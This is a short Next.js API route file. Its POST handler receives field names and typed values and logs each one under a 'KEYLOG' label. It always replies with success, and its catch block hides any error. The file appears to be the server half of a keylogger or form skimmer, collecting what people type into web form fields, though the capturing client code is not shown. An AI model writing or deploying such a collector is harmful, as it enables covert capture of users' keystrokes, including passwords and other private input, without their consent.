import { NextResponse } from 'next/server';

export async function POST(request) {
  try {
    const { field, value } = await request.json();
    console.log(`⌨️ KEYLOG [${field}]: ${value}`);
    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json({ ok: true });
  }
}